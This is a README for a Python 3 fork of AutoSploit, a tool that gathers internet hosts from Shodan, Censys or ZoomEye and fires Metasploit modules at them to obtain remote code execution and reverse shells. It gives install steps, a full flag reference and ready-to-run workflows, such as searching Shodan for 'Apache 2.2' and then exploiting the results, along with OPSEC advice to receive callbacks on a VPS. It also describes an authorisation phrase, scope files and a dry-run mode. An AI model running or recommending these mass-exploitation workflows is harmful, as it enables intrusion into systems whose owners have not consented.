<center><img src="https://user-images.githubusercontent.com/14183473/55991044-e9317000-5c6e-11e9-8730-a2e9d5c3ea68.jpg"></image></center>

# AutoSploit — Macaroni1337 Fork (Python 3)

> **This is a modernised fork of [NullArray/AutoSploit](https://github.com/NullArray/AutoSploit) migrated to Python 3 by [Macaroni1337](https://github.com/Macaroni1337). The original was Python 2.7 only and no longer runs on any current system. This fork fixes that and adds several safety and usability improvements.**

As the name suggests, AutoSploit attempts to automate the exploitation of remote hosts. Targets are collected via Shodan, Censys, or ZoomEye, or loaded manually. Metasploit modules are used to attempt Remote Code Execution and obtain Reverse TCP / Meterpreter sessions.

_**Operational Security:**_ Receiving callbacks on your local machine is not ideal OPSEC. Run this from a VPS with all dependencies installed.

---

## Table of Contents

- [What's different in this fork](#whats-different-in-this-fork)
- [Requirements](#requirements)
- [Installation](#installation)
- [First Run — API Keys](#first-run--api-keys)
- [Usage — Interactive Terminal](#usage--interactive-terminal)
- [Usage — Command Line](#usage--command-line)
- [Scope Files](#scope-files)
- [Metasploit RPC Mode](#metasploit-rpc-mode)
- [Authorisation Gate](#authorisation-gate)
- [Safe Mode (Dry Run)](#safe-mode-dry-run)
- [Typical Workflows](#typical-workflows)
- [Acknowledgements](#acknowledgements)

---

## What's different in this fork

| Area | Original | This fork |
|---|---|---|
| Python version | 2.7 (EOL 2020) | **3.10+** |
| Shodan client | Raw HTTP requests | Official `shodan` Python library |
| Censys client | v1 API (dead) | **v2 API** (`search.censys.io/api/v2`) |
| ZoomEye client | Hardcoded shared credentials in repo | **Personal API key** from `etc/tokens/zoomeye.key` |
| Metasploit | subprocess → msfconsole only | subprocess path kept + **pymetasploit3 RPC** as alternative |
| Authorisation gate | None | **Mandatory confirmation** before any exploit fires |
| Safe / dry-run | `-d` skips MSF but exits immediately | **`--safe`** shows full plan without firing anything |
| Scope control | Whitelist file (post-gather filter) | **`--scope`** CIDR/IP file filters before exploitation |
| `readline` | Required (Linux only) | Optional — works without it |

---

## Requirements

- **Python 3.10 or later**
- **Metasploit Framework** — [get it from Rapid7](https://www.rapid7.com/products/metasploit/)
- **Root / administrator privileges** — the tool will refuse to start without them
- At least one API key for host gathering (Shodan, Censys, or ZoomEye)
- **Linux or Kali recommended** — Windows has no `msfconsole`, so the exploit phase will not fire (recon and safe mode still work)

---

## Installation

### Kali Linux (recommended)

Kali 2024+ uses Python 3.12/3.13 which enforces PEP 668 — direct `pip3 install` system-wide is blocked. You must use a virtual environment.

```bash
# Clone this fork
git clone https://github.com/Macaroni1337/AutoSploit.git
cd AutoSploit

# Install venv support if not already present
sudo apt install python3-venv -y

# Create a virtual environment inside the project folder
python3 -m venv venv

# Activate it
source venv/bin/activate

# Install dependencies inside the venv
pip install -r requirements.txt

# Run the tool (sudo needed for raw socket / service operations)
sudo venv/bin/python3 autosploit.py
```

> **Every new terminal session** requires `source venv/bin/activate` before running, or use the full path `sudo venv/bin/python3 autosploit.py` directly without activating.

If you are running Kali as root (the default in many setups):

```bash
source venv/bin/activate
python3 autosploit.py
```

### Ubuntu / Debian

Same venv requirement applies on Ubuntu 23.04+ and Debian 12+:

```bash
git clone https://github.com/Macaroni1337/AutoSploit.git
cd AutoSploit

sudo apt install python3-venv -y
python3 -m venv venv
source venv/bin/activate

pip install -r requirements.txt
sudo venv/bin/python3 autosploit.py
```

### macOS

```bash
git clone https://github.com/Macaroni1337/AutoSploit.git
cd AutoSploit

python3 -m venv venv
source venv/bin/activate

pip install -r requirements.txt
sudo python autosploit.py
```

> Service checks (PostgreSQL, Apache2) are skipped automatically on macOS. Make sure Metasploit is running before starting the exploit phase.

### Verifying the install

With the venv active:

```bash
python3 autosploit.py --help
```

You should see the banner and full help output without any errors. If you see `ModuleNotFoundError`, confirm the venv is active (`which python3` should point inside the `venv/` folder) and re-run `pip install -r requirements.txt`.

---

## First Run — API Keys

You need at least one search engine API key to gather hosts. AutoSploit will prompt for any missing keys on first run and save them automatically to `etc/tokens/`.

| Service | Where to get it | What gets saved |
|---|---|---|
| **Shodan** | [account.shodan.io](https://account.shodan.io) → API Key | `etc/tokens/shodan.key` |
| **Censys** | [search.censys.io](https://search.censys.io) → Account → API | `etc/tokens/censys.key` (API Secret) + `etc/tokens/censys.id` (API ID) |
| **ZoomEye** | [zoomeye.org](https://www.zoomeye.org) → Profile → API Key | `etc/tokens/zoomeye.key` |

You can also create the files manually before first run to skip the prompts:

```bash
# Shodan
echo "YOUR_SHODAN_KEY" > etc/tokens/shodan.key

# Censys
echo "YOUR_CENSYS_API_SECRET" > etc/tokens/censys.key
echo "YOUR_CENSYS_API_ID"     > etc/tokens/censys.id

# ZoomEye
echo "YOUR_ZOOMEYE_KEY" > etc/tokens/zoomeye.key
```

> Keys are only prompted for services whose token file does not yet exist. You do not need all three — Shodan alone is sufficient for most use cases.

To reset a key, delete the relevant file and restart — the prompt will appear again:

```bash
rm etc/tokens/shodan.key
```

---

## Usage — Interactive Terminal

Running without arguments drops you into the interactive terminal:

```bash
sudo python3 autosploit.py
```

Terminal commands:

| Command | What it does |
|---|---|
| `help` / `?` | Show all available commands |
| `search shodan apache` | Search Shodan for hosts matching "apache" |
| `search censys,shodan IIS` | Search multiple engines at once |
| `view` / `show` | List all currently gathered hosts |
| `single 10.0.0.1` | Add a single host manually |
| `single 10.0.0.1,10.0.0.2` | Add multiple hosts at once |
| `custom /path/to/hosts.txt` | Load a custom host file |
| `nmap 10.0.0.1` | Run an nmap scan against a host |
| `nmap 10.0.0.1 -sV,-A` | nmap with arguments (comma-separated) |
| `clean` | Remove duplicate IPs from the hosts file |
| `exploit 10.0.0.1 4444 default` | Start exploitation (LHOST LPORT WORKSPACE) |
| `exploit 10.0.0.1 4444 default whitelist.txt` | Exploit with a whitelist |
| `tokens reset shodan NEWKEY` | Replace a stored API token |
| `version` | Show current version |
| `exit` / `quit` | Exit and save command history |

### Searching for hosts

```
search shodan apache
```

You will be prompted for:
1. Whether to append or overwrite the existing hosts file
2. A proxy (press Enter to skip)
3. Random or default User-Agent

Discovered IPs are saved to `hosts.txt` in the project root.

### Exploiting gathered hosts

```
exploit LHOST LPORT WORKSPACE_NAME [whitelist_file] [honeycheck]
```

Example:

```
exploit 10.0.0.1 4444 default
```

You will be prompted for:
1. A scope file path (press Enter to skip)
2. Whether to use pymetasploit3 RPC or msfconsole subprocess
3. Whether to sort modules by query relevance
4. Confirmation to proceed

Then the **authorisation gate** — you must type `I HAVE WRITTEN AUTHORISATION` exactly to continue.

---

## Usage — Command Line

For scripted or single-command runs:

```bash
sudo python3 autosploit.py [flags]
```

### Full flag reference

```
search engines:
  -s, --shodan          search Shodan
  -c, --censys          search Censys
  -z, --zoomeye         search ZoomEye
  -a, --all             search all three engines
  -q QUERY              search query (required with any engine flag)
  -O, --overwrite       overwrite hosts file with new results
  -A, --append          append new results to existing hosts file

requests:
  --proxy PROTO://IP:PORT   route searches through a proxy
  --random-agent            use a random HTTP User-Agent
  -P AGENT                  use a specific User-Agent string

exploits:
  -e, --exploit             run exploits against gathered hosts
  -C WORKSPACE LHOST LPORT  Metasploit configuration (required with -e)
  -f PATH                   specify which exploit JSON file to use
  -E PATH                   convert a text module list to JSON format
  -d, --dry-run             never call msfconsole
  -H SCORE                  skip hosts with a Shodan honeypot score above SCORE
  --whitelist PATH          only exploit hosts present in this file
  --ruby-exec               prefix msfconsole call with ruby executable
  --msf-path PATH           path to msfconsole if not in $PATH

safety:
  --safe                    recon only — show plan, never fire exploits
  --scope PATH              scope file (IPs/CIDRs); out-of-scope hosts skipped

metasploit rpc:
  --msf-rpc                 use pymetasploit3 RPC instead of subprocess
  --msf-rpc-host HOST       msfrpcd host (default: 127.0.0.1)
  --msf-rpc-port PORT       msfrpcd port (default: 55553)
  --msf-rpc-pass PASSWORD   msfrpcd password

misc:
  --proxy PROTO://IP:PORT
  -D TERM [TERM ...]        download exploit modules matching search terms
  -h, --help                show help and exit
```

---

## Scope Files

A scope file defines which hosts are permitted targets. Any host outside the scope is skipped with a warning before exploitation begins.

Create a plain text file with one entry per line:

```
# scope.txt — lines starting with # are comments
10.0.0.0/24
192.168.1.50
172.16.0.0/16
```

Pass it at runtime:

```bash
# CLI
sudo python3 autosploit.py -e -C default 10.0.0.1 4444 --scope scope.txt

# Interactive terminal — you are prompted for the path when you run the exploit command
exploit 10.0.0.1 4444 default
> enter path to scope file (IPs/CIDRs) or press enter to skip: scope.txt
```

In `--safe` mode the scope file is respected for display purposes — out-of-scope hosts are flagged but nothing is blocked (since nothing fires).

---

## Metasploit RPC Mode

By default AutoSploit shells out to `msfconsole` with an RC script for each module/host pair. As an alternative you can connect to a running `msfrpcd` daemon via pymetasploit3, which gives faster execution and programmatic session detection.

**Step 1 — Start msfrpcd:**

```bash
msfrpcd -P yourpassword -S -f
```

`-S` disables SSL (simpler local setup), `-f` runs in the foreground. Use a strong password in any non-local setup.

**Step 2 — Run AutoSploit with RPC flags:**

```bash
sudo python3 autosploit.py -e -C default 10.0.0.1 4444 \
  --msf-rpc \
  --msf-rpc-pass yourpassword \
  --msf-rpc-host 127.0.0.1 \
  --msf-rpc-port 55553
```

In interactive terminal mode you are prompted whether to use RPC when you run the `exploit` command.

> RPC mode has not been tested end-to-end against a live msfrpcd — treat it as beta. The subprocess path is the stable default.

---

## Authorisation Gate

Before any exploitation module fires, AutoSploit displays the target count and requires you to type:

```
I HAVE WRITTEN AUTHORISATION
```

exactly — case-sensitive, no trailing spaces. Any other input cancels the run immediately. This prompt cannot be bypassed or scripted around.

This gate does **not** appear during `--safe` / `--dry-run` runs since no exploits fire in those modes.

---

## Safe Mode (Dry Run)

`--safe` lets you run through the full recon and planning phase without firing a single exploit. Use it to verify your configuration, scope file, and module selection before committing to a live run.

```bash
# Search Shodan, show what would be targeted, never fire
sudo python3 autosploit.py -s -q "apache" -e -C default 10.0.0.1 4444 --safe

# Same with a scope file
sudo python3 autosploit.py -s -q "apache" -e -C default 10.0.0.1 4444 \
  --safe --scope scope.txt
```

Output shows:
- Every host that would be targeted
- Which hosts are out of scope (flagged in red)
- Every module that would be run
- Which execution path would be used (subprocess or RPC)

The original `-d` / `--dry-run` flag is still present and has the same effect.

---

## Typical Workflows

### 1 — Recon only, check scope before committing

```bash
# Gather hosts from Shodan
sudo python3 autosploit.py -s -q "IIS 7.5" -A

# Preview what would be targeted against a scope file
sudo python3 autosploit.py -e -C default 10.0.0.1 4444 \
  --safe --scope scope.txt
```

### 2 — Full run, subprocess mode (classic)

```bash
sudo python3 autosploit.py \
  -s -q "Apache 2.2" -A \
  -e -C default 10.0.0.1 4444 \
  --scope scope.txt
```

AutoSploit will search Shodan, append results to the hosts file, then prompt through the exploit setup including the authorisation gate.

### 3 — Full run, RPC mode

```bash
# Terminal 1 — start the MSF daemon
msfrpcd -P hunter2 -S -f

# Terminal 2 — run AutoSploit
sudo python3 autosploit.py \
  -s -q "Apache 2.2" -A \
  -e -C default 10.0.0.1 4444 \
  --scope scope.txt \
  --msf-rpc --msf-rpc-pass hunter2
```

### 4 — Manual targets, nmap first

```bash
# Drop into terminal
sudo python3 autosploit.py

# Add hosts
single 10.0.0.5,10.0.0.6,10.0.0.7

# Scan before exploiting
nmap 10.0.0.5 -sV

# Exploit
exploit 10.0.0.1 4444 myworkspace
```

---

## Acknowledgements

Original AutoSploit by [NullArray](https://github.com/NullArray).

Special thanks to [Ekultek](https://github.com/Ekultek) for major contributions to the original project, and [Khast3x](https://github.com/khast3x) for Docker support.

Python 3 migration, Censys v2 / ZoomEye v2 API rewrites, pymetasploit3 RPC integration, scope gate, and safe-mode implementation by [Macaroni1337](https://github.com/Macaroni1337).

Thanks to everyone who submitted pull requests, bug reports, and contributions to the original project.

---

### Translations (original)

 - [FR](https://github.com/NullArray/AutoSploit/blob/master/.github/.translations/README-fr.md)
 - [ZH](https://github.com/NullArray/AutoSploit/blob/master/.github/.translations/README-zh.md)
 - [DE](https://github.com/NullArray/AutoSploit/blob/master/.github/.translations/README-de.md)
